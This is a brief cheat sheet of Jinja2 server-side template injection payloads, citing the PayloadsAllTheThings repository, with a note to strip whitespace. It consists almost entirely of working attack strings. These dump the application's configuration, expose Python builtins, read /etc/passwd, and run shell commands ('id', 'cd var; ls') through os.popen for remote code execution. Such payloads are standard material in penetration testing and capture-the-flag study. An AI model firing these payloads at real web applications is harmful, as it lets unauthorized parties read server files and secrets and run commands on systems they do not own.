MAY NEED TO REMOVE WHITE SPACES

**SSTI Cheat sheet for Payloads**
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

Prints applications web configuration.
```jinja2
{{ config.items() }}
```

Prints all built in functions
```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

Open files for a given path
```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Gaining RCE, use import function to import OS library if not already there
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

If multiple commands are needed, seperate with **;**
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cd var; ls').read() }}
```